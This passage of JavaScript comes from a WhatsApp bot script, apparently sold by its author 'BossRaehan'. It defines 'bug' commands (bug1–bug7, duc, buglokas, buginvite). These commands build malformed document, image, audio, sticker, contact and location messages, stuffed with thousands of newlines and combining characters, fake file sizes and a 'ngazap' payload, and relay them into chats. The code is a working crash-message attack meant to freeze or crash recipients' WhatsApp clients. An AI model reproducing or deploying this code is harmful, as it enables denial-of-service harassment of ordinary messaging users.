"fileName": `🔥 RAEHAN1986 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonhan}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
BossRaehan.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//════════════════════════════//
case 'duc': {
if (!isCreator) return
if (isBan) throw (from)

var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
						"mimetype": "*/*",
						"title": "IMG-20220802-WA0052.jpeg",
						"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
						"pageCount": 0,
						"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
						"fileName": `🔥 𝗥𝗔𝗘𝗛𝗔𝗡 1986 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonhan}.jpeg`,
						"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
						"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
						"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
BossRaehan.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'bug1': {
if (!isCreator) return
if (isBan) throw (from)

var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: ReyDong })
BossRaehan.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
//════════════════════════════//
case 'bug2': {
if (!isCreator) return
if (isBan) throw (from)

let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
	var image = generateWAMessageFromContent(m.chat,{
"imageMessage": {
					"url": "https://mmg.whatsapp.net/d/f/At7VrBdObWZY2de3bkRQHv71QT-OG1JpEu0ET91LvXf6.enc",
					"mimetype": "image/jpeg",
					"caption": "Done",
					"fileSha256": "5QgkzgrGdeS9fp4ZTKh6wAgUA66m6DT3FldlcSunWfU=",
					"fileLength": "161349999999999",
					"caption": `[⫹⫺ - 㑒 ❝𝗥𝗔𝗘𝗛𝗔𝗡 𝗠𝗢𝗗𝗦 ★ ϟ〽️]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦`,
					"height": 720,
					"width": 403,
					"mediaKey": "0WVIR9TC1RBQZ+hNZWUyayLzDHZ6FxJ3qlA77mS2IQM=",
					"fileEncSha256": "k6Aa66tGP2Vg3LS2R/bLIABBl/G2cIDgP6pdCw6sdRA=",
					"directPath": "/v/t62.7118-24/30927240_463639825803537_6955387786401142368_n.enc?ccb=11-4&oh=01_AVzwXBCI5iAFsXIfUnqLVYS96346tBWyTvoDmf9bK542GA&oe=63510937",
					"mediaKeyTimestamp": "16636898529999",
					"jpegThumbnail": virgam
	}
	},
	{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
	}, contextInfo:{}}) 
	BossRaehan.relayMessage(m.chat, image.message, { messageId: image.key.id})
}
break
//════════════════════════════//
case 'bug3': {
if (!isCreator) return
if (isBan) throw (from)

var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./DataBoss/image/rey.jpg') }, { upload: BossRaehan.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: ReyDong })
BossRaehan.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//════════════════════════════//
case 'bug4': {
if (!isCreator) return
if (isBan) throw (from)

var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/IReEw8uRufv55ehFUGLT1G\n\n© 𝗥𝗔𝗘𝗛𝗔𝗡 1986`,
"matchedText": "https://chat.whatsapp.com/IReEw8uRufv55ehFUGLT1G",
"description": "Undangan Grup WhatsApp",
"title": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: ReyDong })
BossRaehan.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//════════════════════════════//
case 'bug5': {
if (!isCreator) return
if (isBan) throw (from)

var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: ReyDong })
BossRaehan.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
break
//════════════════════════════//
case 'bug6': {
if (!isCreator) return
if (isBan) throw (from)

var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./DataBoss/image/rey.jpg') }, { upload: BossRaehan.waUploadToServer })
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "https://wa.me/c/6281528628870",
"matchedText": "https://wa.me/c/6281528628870",
"description": "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 𝗥𝗔𝗘𝗛𝗔𝗡 1986\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
"title": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: ReyDong })
BossRaehan.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//════════════════════════════//
case 'bug7': {
if (!isCreator) return
if (isBan) throw (from)

var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:BossRaehan\nitem1.TEL;waid=6281528628870:+6281528628870\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer 𝗥𝗔𝗥𝗛𝗔𝗡 1986WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:BossRaehan\nEND:VCARD",
}
}), { userJid: m.chat, quoted: ReyDong })
BossRaehan.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
//════════════════════════════//
case 'lokas': {
if (!isCreator) return
if (isBan) throw (from)

var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./DataBoss/image/rey.jpg') }, { upload: BossRaehan.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: ReyDong })
BossRaehan.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
case 'buglokas': {
if (!isCreator) return
if (isBan) throw (from)

var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./DataBoss/image/rey.jpg') }, { upload: BossRaehan.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: ReyDong })
BossRaehan.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
break
//════════════════════════════//
case 'buginvite': {
if (!isCreator) return
if (isBan) throw (from)

